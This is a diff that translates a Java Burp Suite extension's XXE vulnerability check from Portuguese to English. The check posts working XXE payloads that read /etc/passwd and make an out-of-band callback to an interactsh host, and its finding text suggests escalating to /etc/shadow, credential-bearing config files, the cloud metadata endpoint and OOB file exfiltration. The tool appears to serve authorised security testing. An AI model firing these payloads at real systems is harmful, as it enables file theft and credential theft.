@@ -13,68 +13,68 @@ import java.util.List;
 import java.util.regex.Pattern;
 
 /**
- * XML External Entity Injection: envia um corpo XML com uma DOCTYPE
- * declarando uma entidade externa apontando para /etc/passwd, pra endpoints
- * que aceitam XML. Se o conteúdo do arquivo voltar na resposta, o parser
- * XML do servidor está processando entidades externas sem restrição.
+ * XML External Entity Injection: sends an XML body with a DOCTYPE declaring
+ * an external entity pointing at /etc/passwd, to endpoints that accept XML.
+ * If the file's content comes back in the response, the server's XML parser
+ * is processing external entities with no restriction.
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class XxeCheck implements VulnCheck {
 
     private static final String[] PATHS = {"/api/xml", "/api/upload", "/api/import", "/xmlrpc.php", "/api/data", "/"};
 
-    private static final String PAYLOAD_XXE =
+    private static final String XXE_PAYLOAD =
             "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
             "<!DOCTYPE rx0 [ <!ENTITY rx0xxe SYSTEM \"file:///etc/passwd\"> ]>\n" +
             "<root><data>&rx0xxe;</data></root>";
 
-    private static final Pattern ASSINATURA_PASSWD = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
-    private static final Pattern ASSINATURA_ERRO_XXE = Pattern.compile(
+    private static final Pattern PASSWD_SIGNATURE = Pattern.compile("root:.*:0:0:", Pattern.CASE_INSENSITIVE);
+    private static final Pattern XXE_ERROR_SIGNATURE = Pattern.compile(
             "DOCTYPE is disallowed|external entit(y|ies)|SAXParseException|XMLStreamException", Pattern.CASE_INSENSITIVE);
 
     @Override
-    public String nome() {
+    public String name() {
         return "XXE — XML External Entity Injection";
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        return executar(api, baseUrl, (ScanContext) null);
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        return execute(api, baseUrl, (ScanContext) null);
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
-        // --- Confirmação OOB via interactsh: entidade externa apontando pro nosso host (XXE-via-SSRF) ---
-        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
+        // --- OOB confirmation via interactsh: an external entity pointing at our host (XXE-via-SSRF) ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
             for (String path : PATHS) {
                 try {
-                    String host = ctx.interactsh().criarProbe(
-                            "XXE confirmado via interação out-of-band em " + path,
-                            Severity.CRITICA,
+                    String host = ctx.interactsh().createProbe(
+                            "XXE confirmed via out-of-band interaction at " + path,
+                            Severity.CRITICAL,
                             base + path,
-                            "O parser XML do endpoint processou uma entidade externa apontando para um domínio único de teste, " +
-                                    "e a requisição foi efetivamente recebida — confirmação inequívoca de XXE, mesmo quando o " +
-                                    "conteúdo lido não é refletido diretamente na resposta (blind XXE).",
-                            "Desabilite DOCTYPE/entidades externas no parser XML, ou use um parser que não suporte DTDs externas por padrão.",
-                            "1) Reproduza o payload XML apontando a entidade pro domínio de teste. 2) Como confirmou blind XXE, " +
-                                    "use esse mesmo canal pra exfiltrar arquivos: declare uma entidade parameter XML que lê o " +
-                                    "arquivo local e o anexa como parte da URL externa requisitada (XXE OOB data exfiltration).");
+                            "The endpoint's XML parser processed an external entity pointing at a unique test domain, " +
+                                    "and the request was actually received — an unambiguous confirmation of XXE, even when the " +
+                                    "content read is not directly reflected in the response (blind XXE).",
+                            "Disable DOCTYPE/external entities in the XML parser, or use a parser that doesn't support external DTDs by default.",
+                            "1) Reproduce the XML payload pointing the entity at the test domain. 2) Since this confirmed blind XXE, " +
+                                    "use this same channel to exfiltrate files: declare an XML parameter entity that reads the " +
+                                    "local file and appends it as part of the requested external URL (XXE OOB data exfiltration).");
                     if (host != null) {
-                        String payloadOob = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                        String oobPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                 "<!DOCTYPE rx0 [ <!ENTITY rx0oob SYSTEM \"http://" + host + "/rx0-xxe-oob-probe\"> ]>\n" +
                                 "<root><data>&rx0oob;</data></root>";
-                        HttpRequest reqOob = HttpRequest.httpRequestFromUrl(base + path)
+                        HttpRequest oobReq = HttpRequest.httpRequestFromUrl(base + path)
                                 .withMethod("POST")
                                 .withAddedHeader("Content-Type", "application/xml")
-                                .withBody(payloadOob);
-                        api.http().sendRequest(reqOob);
+                                .withBody(oobPayload);
+                        api.http().sendRequest(oobReq);
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de XXE (" + path + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error firing XXE OOB probe (" + path + "): " + e.getMessage());
                 }
             }
         }
@@ -85,44 +85,44 @@ public class XxeCheck implements VulnCheck {
                 HttpRequest req = HttpRequest.httpRequestFromUrl(url)
                         .withMethod("POST")
                         .withAddedHeader("Content-Type", "application/xml")
-                        .withBody(PAYLOAD_XXE);
+                        .withBody(XXE_PAYLOAD);
                 HttpResponse resp = api.http().sendRequest(req).response();
                 if (resp == null) continue;
 
                 String body = resp.bodyToString();
                 if (body == null) continue;
 
-                if (ASSINATURA_PASSWD.matcher(body).find()) {
-                    achados.add(new Finding(
-                            "XXE confirmado em " + path,
-                            Severity.CRITICA,
+                if (PASSWD_SIGNATURE.matcher(body).find()) {
+                    findings.add(new Finding(
+                            "XXE confirmed at " + path,
+                            Severity.CRITICAL,
                             url,
-                            "O servidor processou a entidade externa declarada no XML e retornou o conteúdo de /etc/passwd na " +
-                                    "resposta — confirmação de XML External Entity Injection, que pode permitir leitura de arquivos " +
-                                    "arbitrários e, em alguns casos, SSRF ou negação de serviço.",
-                            "Payload enviado via Content-Type: application/xml | Conteúdo de /etc/passwd encontrado na resposta.",
-                            "Desabilite DOCTYPE/entidades externas no parser XML (ex: setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) " +
-                                    "em Java), ou use um parser que não suporte DTDs externas por padrão.",
-                            "1) No Repeater, reenvie o POST pra " + url + " com o Content-Type application/xml e o payload com DOCTYPE. " +
-                                    "2) Troque o alvo da entidade pra ler outros arquivos (ex: file:///etc/shadow, ou no Windows C:\\Windows\\win.ini, " +
-                                    "ou um arquivo de config da aplicação com credenciais). 3) Para testar SSRF via XXE, troque a entidade por uma " +
-                                    "URL interna (ex: SYSTEM \"http://169.254.169.254/latest/meta-data/\"). 4) Para blind XXE (sem retorno direto), " +
-                                    "use Out-of-Band XXE via Burp Collaborator como canal externo."));
-                } else if (ASSINATURA_ERRO_XXE.matcher(body).find()) {
-                    achados.add(new Finding(
-                            "Endpoint processa XML com DOCTYPE (XXE não confirmado, requer revisão)",
-                            Severity.MEDIA,
+                            "The server processed the external entity declared in the XML and returned the content of " +
+                                    "/etc/passwd in the response — a confirmed XML External Entity Injection, which can allow " +
+                                    "arbitrary file reads and, in some cases, SSRF or denial of service.",
+                            "Payload sent via Content-Type: application/xml | Content of /etc/passwd found in the response.",
+                            "Disable DOCTYPE/external entities in the XML parser (e.g. setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) " +
+                                    "in Java), or use a parser that doesn't support external DTDs by default.",
+                            "1) In Repeater, resend the POST to " + url + " with Content-Type application/xml and the DOCTYPE payload. " +
+                                    "2) Change the entity's target to read other files (e.g. file:///etc/shadow, or on Windows C:\\Windows\\win.ini, " +
+                                    "or an application config file with credentials). 3) To test SSRF via XXE, swap the entity for an " +
+                                    "internal URL (e.g. SYSTEM \"http://169.254.169.254/latest/meta-data/\"). 4) For blind XXE (no direct return), " +
+                                    "use Out-of-Band XXE via Burp Collaborator as the external channel."));
+                } else if (XXE_ERROR_SIGNATURE.matcher(body).find()) {
+                    findings.add(new Finding(
+                            "Endpoint processes XML with a DOCTYPE (XXE not confirmed, needs review)",
+                            Severity.MEDIUM,
                             url,
-                            "O servidor retornou um erro relacionado ao processamento de DOCTYPE/entidades externas — o parser " +
-                                    "tentou processar a entidade mas algo bloqueou (pode já estar mitigado, ou pode precisar de outro " +
-                                    "vetor/payload pra confirmar). Vale uma investigação manual.",
-                            "Status: " + resp.statusCode() + " | Mensagem de erro relacionada a DOCTYPE/entidade encontrada.",
-                            "Confirme manualmente se o parser está de fato bloqueando entidades externas em todos os caminhos de código."));
+                            "The server returned an error related to DOCTYPE/external entity processing — the parser " +
+                                    "tried to process the entity but something blocked it (it may already be mitigated, or it may need another " +
+                                    "vector/payload to confirm). Worth a manual investigation.",
+                            "Status: " + resp.statusCode() + " | Error message related to DOCTYPE/entity found.",
+                            "Manually confirm whether the parser actually blocks external entities on every code path."));
                 }
             } catch (Exception e) {
-                api.logging().logToError("[Rx0] Erro no check de XXE (" + path + "): " + e.getMessage());
+                api.logging().logToError("[Rx0] Error in XXE check (" + path + "): " + e.getMessage());
             }
         }
-        return achados;
+        return findings;
     }
 }
